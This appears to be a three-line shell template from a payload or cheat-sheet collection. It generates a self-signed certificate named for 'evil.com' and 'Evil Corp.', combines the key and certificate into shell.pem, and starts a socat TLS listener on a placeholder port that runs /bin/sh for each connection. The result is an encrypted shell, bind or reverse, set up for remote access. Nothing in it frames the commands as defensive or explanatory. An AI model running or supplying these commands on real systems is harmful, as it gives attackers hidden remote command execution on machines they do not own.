openssl req -newkey rsa:2048 -nodes -x509 -days 365 -subj '/CN=evil.com/O=Evil Corp./C=US' -keyout ./shell.key -out ./shell.crt
cat ./shell.key ./shell.crt > ./shell.pem
socat openssl-listen:§LPORT§,cert=shell.pem,verify=0,reuseaddr,fork exec:/bin/sh
